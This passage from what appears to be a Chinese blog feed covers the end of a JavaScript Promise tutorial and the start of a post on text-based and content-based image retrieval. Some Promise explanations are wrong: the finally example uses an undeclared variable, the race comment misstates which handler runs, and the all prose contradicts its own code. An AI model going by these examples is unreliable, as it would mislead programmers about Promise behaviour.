function_">then</span>(<span class="keyword">function</span>(<span class="params">newResult</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">doThirdThing</span>(newResult);</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">finalResult</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;最终结果: &#x27;</span> + finalResult);</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">catch</span>(failureCallback);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在这个例子中，每个 <code>then</code> 都返回一个新的 <code>Promise</code>，并且每个 <code>Promise</code> 的解决值都是上一个回调函数的返回值。如果在任何一个步骤中出现错误，<code>catch</code> 方法将捕获这个错误，你可以在这里处理错误。这就是 <code>Promise</code> 链式调用的强大之处。</p><h3 id="catch-onRejected"><a href="#catch-onRejected" class="headerlink" title="catch(onRejected)"></a>catch(onRejected)</h3><p><code>catch(onRejected)</code> 方法是 <code>Promise</code> 对象的一个方法，它用于处理 <code>Promise</code> 被拒绝（即执行了 <code>reject</code> 函数）的情况。</p><ul><li><strong>作用</strong>：<ul><li><code>catch(onRejected)</code> 方法为 <code>Promise</code> 添加一个 <code>onRejected</code> 回调函数，这个函数在 <code>Promise</code> 被拒绝时执行。</li></ul></li><li><strong>特性</strong>：<ul><li><code>catch</code> 方法会返回一个新的 <code>Promise</code> 对象。</li><li>这个新的 <code>Promise</code> 将以 <code>catch</code> 方法中回调函数的返回值来解决（resolve）。</li></ul></li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 这里的 Promise 被明确地拒绝了</span></span><br><span class="line">  <span class="title function_">reject</span>(<span class="number">100</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">promise</span><br><span class="line">  .<span class="title function_">catch</span>(<span class="function">(<span class="params">reason</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 这里处理 Promise 被拒绝的情况</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(reason); <span class="comment">// 输出：100</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">200</span>; <span class="comment">// &#x27;catch&#x27; 函数的返回值将作为新 Promise 的解决结果</span></span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 这里处理上一个 &#x27;catch&#x27; 返回的新 Promise 的解决结果</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res); <span class="comment">// 输出：200</span></span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>在以上代码示例中，<code>promise</code> 是一个被明确拒绝（<code>reject(100)</code>）的 <code>Promise</code> 对象。当 <code>promise</code> 被拒绝时，<code>.catch</code> 方法中的回调函数被调用，并打印出拒绝的原因（在这个例子中是数字 <code>100</code>）。然后，<code>catch</code> 方法中的回调函数返回了一个值 <code>200</code>，这个值将作为新 <code>Promise</code> 的解决结果。</p><p>接下来，<code>.then</code> 方法被用来处理这个新 <code>Promise</code> 的解决结果。因为 <code>catch</code> 方法返回的新 <code>Promise</code> 被解决（resolve）了，所以 <code>.then</code> 方法中的回调函数会被执行，并打印出 <code>200</code>。</p><p>通过这种方式，<code>catch</code> 不仅允许我们处理错误，还可以恢复代码执行流程，允许后续的 <code>then</code> 方法继续正常工作。这是 <code>Promise</code> 链式调用中错误处理的一个重要部分。</p><h3 id="finally-finallyCallback"><a href="#finally-finallyCallback" class="headerlink" title="finally(finallyCallback)"></a>finally(finallyCallback)</h3><p><code>finally(finallyCallback)</code> 方法是 <code>Promise</code> 对象的一个方法，它允许你添加一个不依赖于 <code>Promise</code> 最终状态的回调函数。这个 <code>finallyCallback</code> 无论 <code>Promise</code> 成功（resolved）还是失败（rejected），都会被执行。</p><ul><li><strong>作用</strong>：<ul><li><code>finally(finallyCallback)</code> 方法给 <code>Promise</code> 添加一个事件处理回调函数，这个函数在 <code>Promise</code> 完成后总会执行。</li></ul></li><li><strong>特性</strong>：<ul><li><code>finally</code> 方法不接收任何参数，这意味着你不能从 <code>finallyCallback</code> 内部获取到 <code>Promise</code> 的执行结果。</li><li><code>finally</code> 方法会返回一个新的 <code>Promise</code>。这个新的 <code>Promise</code> 通常与原始 <code>Promise</code> 有相同的状态和值，除非 <code>finallyCallback</code> 中抛出了异常或返回了一个被拒绝的 <code>Promise</code>。</li></ul></li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 这里的 Promise 被解决了</span></span><br><span class="line">  <span class="title function_">resolve</span>(<span class="number">100</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">promise</span><br><span class="line">  .<span class="title function_">finally</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// &#x27;finally&#x27; 回调函数无论成功或者失败，始终会被执行</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;finally回调函数无论成功或者失败，始终会被执行&quot;</span>);</span><br><span class="line">    <span class="comment">// &#x27;finally&#x27; 回调函数内获取不到promise执行结果，所以这里打印 undefined</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res); <span class="comment">// 输出：undefined</span></span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// &#x27;finally&#x27; 回调函数返回一个新的promise，实现链式调用</span></span><br><span class="line">    <span class="comment">// 这里的 &#x27;res&#x27; 是上一个 &#x27;resolve&#x27; 的结果</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res); <span class="comment">// 输出：100</span></span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>在以上代码示例中，<code>promise</code> 是一个被解决（<code>resolve(100)</code>）的 <code>Promise</code> 对象。<code>.finally</code> 方法添加了一个回调函数，这个函数会在 <code>Promise</code> 完成后执行，但它不会接收任何参数，因此 <code>console.log(res);</code> 中的 <code>res</code> 是 <code>undefined</code>。</p><p>然后，<code>.then</code> 方法处理 <code>Promise</code> 的解决结果。由于 <code>finally</code> 方法不改变 <code>Promise</code> 的状态或值（除非抛出异常或返回被拒绝的 <code>Promise</code>），所以 <code>.then</code> 方法中的回调函数会接收到 <code>100</code> 并打印出来。</p><p><code>finally</code> 方法通常用于执行清理操作，例如关闭文件、清除超时等，这些操作不依赖于操作的成功或失败。这使得代码更加简洁，因为你不需要在 <code>then</code> 和 <code>catch</code> 中重复相同的清理逻辑。</p><h2 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h2><h3 id="Promise-all-promiseArray"><a href="#Promise-all-promiseArray" class="headerlink" title="Promise.all(promiseArray)"></a>Promise.all(promiseArray)</h3><p><code>Promise.all(promiseArray)</code> 是一个用于处理多个 <code>Promise</code> 对象的方法。它接受一个数组作为参数，这个数组可以包含 <code>Promise</code> 对象或其他值。</p><ul><li><strong>作用</strong>：<ul><li><code>Promise.all</code> 接受一个数组作为参数，这个数组中可以包含 <code>Promise</code> 对象和其他类型的值。</li><li>它将并发执行数组中的所有 <code>Promise</code> 对象，并且会等待所有 <code>Promise</code> 对象执行完毕。</li></ul></li><li><strong>特性</strong>：<ul><li>执行结果会以数组形式返回，数组中的元素顺序与传入的 <code>promiseArray</code> 一一对应。</li><li>如果数组中的元素是普通值，<code>Promise.all</code> 会直接将这些值放入结果数组中。</li><li>如果数组中的元素是 <code>Promise</code> 对象，<code>Promise.all</code> 会等待这些 <code>Promise</code> 对象执行结束，并将结果放入返回的数组中。</li></ul></li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建两个 Promise 对象</span></span><br><span class="line"><span class="keyword">const</span> promise1 = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">resolve</span>(<span class="string">&quot;p1&quot;</span>);</span><br><span class="line">  &#125;, <span class="number">2000</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> promise2 = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">resolve</span>(<span class="string">&quot;p2&quot;</span>);</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 Promise.all 处理包含普通值和 Promise 对象的数组</span></span><br><span class="line"><span class="keyword">const</span> promiseAll = <span class="title class_">Promise</span>.<span class="title function_">all</span>([<span class="number">1</span>, <span class="number">2</span>, promise1, <span class="number">3</span>, <span class="number">4</span>, promise2, <span class="number">5</span>]);</span><br><span class="line">promiseAll.<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 并发执行 Promise，等待所有任务执行完毕后统一返回结果</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(res); <span class="comment">// 输出：[1, 2, &quot;p1&quot;, 3, 4, &quot;p2&quot;, 5]</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果数组中的任何一个 Promise 执行失败，整个 Promise.all 将执行失败</span></span><br><span class="line"><span class="keyword">const</span> promiseAllFail = <span class="title class_">Promise</span>.<span class="title function_">all</span>([<span class="number">1</span>, <span class="number">2</span>, promise1, <span class="number">3</span>, <span class="number">4</span>, <span class="title class_">Promise</span>.<span class="title function_">reject</span>(<span class="string">&#x27;失败&#x27;</span>), <span class="number">5</span>]);</span><br><span class="line">promiseAllFail.<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 任何一个任务失败，将导致整个 Promise.all 执行失败</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;fail&#x27;</span>, e); <span class="comment">// 输出：fail 失败</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在代码示例中，<code>promise1</code> 和 <code>promise2</code> 是两个 <code>Promise</code> 对象，它们分别在 2000 毫秒和 1000 毫秒后解决。<code>promise2</code> 被拒绝了。在这种情况下，<code>Promise.all</code> 返回的 <code>Promise</code> 也会被拒绝，并且 <code>catch</code> 方法会被调用。这意味着，如果 <code>promiseArray</code> 中任何一个 <code>Promise</code> 对象被拒绝，<code>Promise.all</code> 返回的 <code>Promise</code> 也会被拒绝，即使其他 <code>Promise</code> 对象已经成功解决。</p><h3 id="Promise-allSettled"><a href="#Promise-allSettled" class="headerlink" title="Promise.allSettled"></a>Promise.allSettled</h3><p><code>Promise.allSettled</code> 允许你同时处理多个 promise。这个方法会等待所有传入的 promises 要么完成（fulfilled），要么拒绝（rejected），然后返回一个对象数组，每个对象表示对应的 promise 结果。</p><ul><li><strong>特性</strong><ul><li><strong>返回值</strong>：它返回一个 promise，该 promise 在所有给定的 promises 已经完成或拒绝后解决。</li><li><strong>结果对象</strong>：每个结果都是一个对象，包含两个属性：<code>status</code> 和 <code>value</code> 或 <code>reason</code>。如果 promise 成功完成，<code>status</code> 为 <code>&#39;fulfilled&#39;</code>，并且 <code>value</code> 属性会包含 promise 的结果。如果 promise 被拒绝，<code>status</code> 为 <code>&#39;rejected&#39;</code>，并且 <code>reason</code> 属性会包含拒绝的原因。</li><li><strong>错误处理</strong>：与 <code>Promise.all</code> 不同，<code>Promise.allSettled</code> 不会在遇到第一个拒绝的 promise 时立即拒绝。它会等待所有的 promises 都已经完成或拒绝，给你一个完整的结果集。</li></ul></li></ul><p>这里就不给代码示范了，直接把这个方法当作 <code>.all</code> 的改版就行。但注意，虽然 <code>Promise.allSettled</code> 目前已经是 ECMAScript 2020 标准的一部分，但在一些旧的浏览器版本中可能不被支持。在使用之前，最好检查目标环境是否支持这个特性。如果不支持，就需要使用一个 polyfill 来提供相同的功能。</p><h3 id="Promise-race"><a href="#Promise-race" class="headerlink" title="Promise.race"></a><strong>Promise.race</strong></h3><p><strong><code>Promise.race</code></strong> 用来处理多个 promises。这个方法接受一个 promise 数组作为输入，并且会返回一个新的 promise，这个新的 promise 会以数组中<strong>第一个</strong>完成（无论是解决还是拒绝）的 promise 的结果来解决。</p><ul><li>特征<ul><li><strong>并发执行</strong>：传入的所有 promises 会同时开始执行。</li><li><strong>快速响应</strong>：只要数组中的任何一个 promise 完成，<strong><code>Promise.race</code></strong> 就会立即解决。</li><li><strong>结果</strong>：返回的 promise 的结果是数组中第一个完成的 promise 的结果。</li><li><strong>用途</strong>：常用于实现超时功能，例如，如果一个网络请求在指定时间内没有响应，就会被认为是超时。</li></ul></li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promise1 = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">resolve</span>(<span class="string">&quot;p1&quot;</span>);</span><br><span class="line">  &#125;, <span class="number">2000</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> promise2 = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">resolve</span>(<span class="string">&quot;p2&quot;</span>);</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> promise3 = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 假设500毫秒后网络超时</span></span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">reject</span>(<span class="string">&quot;超时了&quot;</span>);</span><br><span class="line">  &#125;, <span class="number">500</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> promiseRace = <span class="title class_">Promise</span>.<span class="title function_">race</span>([promise1, promise2, promise3]);</span><br><span class="line">promiseRace</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 这里会打印出 &quot;超时了&quot;，因为 promise3 是最快完成的</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">catch</span>(<span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 如果 promise3 被拒绝，错误会在这里被捕获</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;fail&quot;</span>, e);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>代码示例中，<strong><code>promise1</code></strong>、<strong><code>promise2</code></strong> 和 <strong><code>promise3</code></strong> 分别设置了不同的超时时间。<strong><code>Promise.race</code></strong> 会返回最快完成的 promise 的结果。在这个例子中，<strong><code>promise3</code></strong> 由于设置了最短的超时时间（500毫秒），所以它会首先完成，无论是解决还是拒绝，<strong><code>Promise.race</code></strong> 都会以 <strong><code>promise3</code></strong> 的结果来解决。</p><p>在实际应用中，<strong><code>Promise.race</code></strong> 可以帮助你确保你的程序在遇到慢网络连接或者其他可能导致延迟的情况时，能够及时响应。</p><h3 id="Promise-reject"><a href="#Promise-reject" class="headerlink" title="Promise.reject"></a><strong>Promise.reject</strong></h3><p><strong><code>Promise.reject</code></strong> 方法在 JavaScript 中用于创建一个状态为拒绝（rejected）的 Promise。这个方法通常用于测试或者当你需要一个已知会失败的 Promise 时。</p><ul><li>特征<ul><li>你可以传递任何理由（reason），这个理由会被传递给 <strong><code>.catch()</code></strong> 方法的回调函数。</li></ul></li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Promise</span>.<span class="title function_">reject</span>(<span class="string">&quot;rejected&quot;</span>)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 这个回调不会被调用，因为 Promise 已经被拒绝</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;value&#x27;</span>, res);</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">catch</span>(<span class="function">(<span class="params">reason</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 这个回调会被调用，打印出 &quot;reason rejected&quot;</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;reason&#x27;</span>, reason);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>代码示例中，<strong><code>Promise.reject</code></strong> 被用来创建一个立即失败的 Promise，并且提供了一个字符串 “rejected” 作为失败的理由。然后，使用 <strong><code>.then()</code></strong> 方法来设置一个处理成功解决的回调函数，以及使用 <strong><code>.catch()</code></strong> 方法来设置一个处理拒绝的回调函数。</p><p>在实际应用中，<strong><code>Promise.reject</code></strong> 可以用于快速创建一个失败的 Promise，以便于在函数中进行错误处理或者在测试中模拟失败的异步操作。</p><h3 id="Promise-resolve"><a href="#Promise-resolve" class="headerlink" title="Promise.resolve"></a>Promise.resolve</h3><p><code>Promise.resolve</code> 方法在 JavaScript 中用于创建一个状态为解决（fulfilled）的 Promise。这个方法可以接受任何值，并返回一个以该值解决的 Promise。</p><ul><li><strong>特征</strong><ul><li><strong>普通值</strong>：如果传递给 <code>Promise.resolve</code> 的是一个普通值，它会返回一个新的 Promise，该 Promise 会立即以该值解决。</li><li><strong>Promise 值</strong>：如果传递的值本身是一个 Promise，<code>Promise.resolve</code> 将不会创建一个新的 Promise，而是返回那个原始的 Promise。</li></ul></li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个立即解决为100的Promise</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="number">100</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 这个回调会被调用，打印出100</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(res); <span class="comment">//100</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个新的Promise，它将会被拒绝</span></span><br><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">reject</span>(<span class="number">200</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 这里的.then()没有提供拒绝处理函数，所以拒绝将不会被处理</span></span><br><span class="line">promise</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 这个回调不会被调用，因为Promise已经被拒绝</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代码示例中，<code>Promise.resolve</code> 被用来创建一个立即以数字 <code>100</code> 解决的 Promise。然后，使用 <code>.then()</code> 方法来设置一个处理解决的回调函数。</p><p>请注意，第二个例子中的 Promise 被拒绝了，但是没有提供 <code>.catch()</code> 方法或拒绝处理函数，所以拒绝不会被捕获或处理。在实际应用中，<code>Promise.resolve</code> 可以用于确保有一个解决的 Promise，这在处理同步和异步代码时非常有用。</p>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> Promise </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像纹理特征提取|灰度共生矩阵</title>
      <link href="/2024/06/10/2024/glcm/"/>
      <url>/2024/06/10/2024/glcm/</url>
      
        <content type="html"><![CDATA[<p>数字图像处理的拓展内容，上课时被分配了“图像检索及 AI 应用”，想搞个小实践水水念 PPT 的时间，就稍微研究下图像纹理特征分析，也顺带写篇博客。</p><h2 id="图像检索发展"><a href="#图像检索发展" class="headerlink" title="图像检索发展"></a>图像检索发展</h2><p>在 Web2.0 时代，互联网中的信息量爆炸性增长，其中自然包含了很多图片。在 Twitter、FaceBook 等各种社交媒体平台，每月用户上传的图片数量都在 10 亿上下，而以淘宝、亚马逊为代表的电子商务平台，其后台存储的图片数量更是以百亿记。面对如此浩瀚且包含了丰富视觉信息的图片，如何从中精准快速地检索出我们想要的图片，已经成为了多媒体信息检索技术研究的热点。</p><h3 id="基于文本的图像检索技术-TBIR"><a href="#基于文本的图像检索技术-TBIR" class="headerlink" title="基于文本的图像检索技术 TBIR"></a>基于文本的图像检索技术 TBIR</h3><p>按发展顺序，可先后分为基于文本的图像检索技术（TBIR, Text Based Image Retrieval）和基于内容的图像检索技术（CBIR, Content Based Image Retrieval），前者可以理解为人工&#x2F;半人工给图片打 tag，然后检索时根据 tag 匹配度检索图片，后者则是正经的使用计算机通过公式化的流程分析图片特征，然后实现以图搜图。</p><p>先说 TBIR，这种技术好用吗？确实好用，因为实现难度不高，甚至你自己建立个数据库，给自己收藏的图片打 tag，然写个根据 tag 的搜索功能，这就算是一种 TBIR 的实现。而且因为是通过人工的方式给图像信息打 tag，而用户也是人，这样检索图像的准确率比较高。</p><p>但从上述的简单流程就能看出，TBIR 也有一些明显的缺陷：给图片标注文本信息需要人工的介入，如果图像数据很庞大，就会耗费大量人力物力，这使得其无法被用于大规模的图像数据；同时也是因为人工的介入，导致标注信息时难免混入一些标注者的主观考量，同一张图片你很难让两个人给出完全一致的 tag 列表，这就会导致检索时的不准确。再另一方面，很多用户本身也没法做到精确描述自己需要的图片信息，比如下面这张图：</p><p><img src="https://img.ma5hr00m.top/blog/image-20240616145916690.png" alt="image-20240616145916690"></p><p>你可能很喜欢这种风格，然后你打开了 Pinterest，接下来应该搜索什么关键词来描述这种风格呢？经验丰富的标注者可以使用 <code>LowPoly</code> 精准描述这种风格，但多数用户不能，这问题不是 TBIR 能解决的，毕竟连用户都不知道要搜什么，检索能力再强也没用。</p><h3 id="基于内容的图像检索技术-CBIR"><a href="#基于内容的图像检索技术-CBIR" class="headerlink" title="基于内容的图像检索技术 CBIR"></a>基于内容的图像检索技术 CBIR</h3><p>所以，在 1992 年，美国国家科学基金会就图像数据库管理系统新发展方向达成一致共识，表示索引图像信息的最有效方式应该是基于图像内容自身的。自此，基于内容的图像检索技术便逐步建立起来，并在近十多年里得到了迅速的发展。</p><p>典型的 CBIR 框架如下，大致可总结为三个阶段：</p><ol><li><strong>特征提取</strong>：计算机分析图像数据库中的每张图片，提取出颜色、纹理、形状等低层次视觉特征，并将这些特征转化为特征向量存储在图像特征库中。</li><li><strong>查询处理</strong>：当用户提交一张查询图像时，系统会用相同的方法提取其特征。</li><li><strong>相似性度量与排序输出</strong>：系统将查询图像的特征向量与特征库中的向量进行比较，根据相似性度量准则计算相似度，并将结果按相似度高低排序输出。</li></ol><p><img src="https://img.ma5hr00m.top/blog/image-20240616150943134.png" alt="image-20240616150943134"></p><p>CBIR 将标注图片、分析图片、检索图片的工作全部交给计算机，客服了 TBIR 的不足，极大地提高了检索效率以及可使用图像检索技术的规模。但也带来了一个问题：计算机不是人类，它很难理解高层语义，所以其图像特征的描述与人类存在语义鸿沟。</p><p>这“高层语义”指的是人类对图像内容的抽象理解，比如识别图像中的场景或情感。这些含义通常超出了简单的视觉特征所能表达的范围，你可以使用“可爱”这种描述搜索出毛茸茸的小猫小狗，计算机很难办到，因为计算机无法直接理解“可爱”是什么，<strong>语义鸿沟是无法消除的</strong>，它只能通过一些额外的手段来弥补这种鸿沟。比如在实现图像检索时就预先告知计算机，“可爱”这种特征可以拆解为“多毛”、“眼睛在面部占比大”、“头身比低”等一系列特征，然后再将这些特征一步步分解，直到转化为计算机可以理解的图像视觉特征，比如纹理、颜色、形状等。</p><p>但经过这一道道的转化，图像检索的准确率就会无可避免的下降，然后就需要再通过其他额外手段弥补这种缺陷。这就导致了 CBIR 虽然在很大程度解放了人力，但实现起来比较困难。</p><p>TBIR 和 CBIR 在现代都得到了广泛应用。分别别举一个贴近生活的案例：常见的图片素材库，比如 Pinterest 和 花瓣网，都主要依靠 TBIR 技术；电子商务方面比如淘宝的拍立淘，就是主要基于 CBIR 技术。</p><p>然后呢，随着 AI 技术大力发展，人们发现可以和图像检索技术结合使用，现代图像检索技术与 AI 的结合主要涉及到深度学习等新技术的研究和应用。深度学习可以自动学习和提取图像中的特征，处理更复杂的场景和任务。例如，深度神经网络能够自动提取图像特征进行分类，生成对抗网络（GAN）可以生成相似图片扩展数据集，自编码器可用于降噪和去模糊等。</p><h2 id="图像通用视觉特征"><a href="#图像通用视觉特征" class="headerlink" title="图像通用视觉特征"></a>图像通用视觉特征</h2><p>图像特征的提取与表达是 CBIR 的基础。广义上讲，图像的特征包括基于文本的特征和视觉特征，前者在数据库系统和信息检索领域已有深入研究，这里只介绍后者。</p><p>而视觉特征又可以分为两类：通用视觉特征和领域相关视觉特征。通用视觉特征就是我们肉眼所能看到的基本信息，适用于所有类型的图像；而领域相关视觉特征则依赖于特定领域的知识，如面部或指纹特征。不同的表达方法可以从不同角度描述一个特征，并没有所谓的“最佳”表达方式。</p><p>通用视觉特征包括我们最常用的三种对图像的描述方式：色彩、纹理与形状。</p><h3 id="颜色特征"><a href="#颜色特征" class="headerlink" title="颜色特征"></a>颜色特征</h3><p>颜色特征是在图像检索中应用最为广泛的视觉特征，主要原因在于颜色往往和图像中所包含的 物体或场景十分相关。此外，与其他的视觉特征相比，颜色特征对图像本身的尺寸、方向、视角的依赖性较小，从而具有较高的鲁棒性。</p><h3 id="纹理特征"><a href="#纹理特征" class="headerlink" 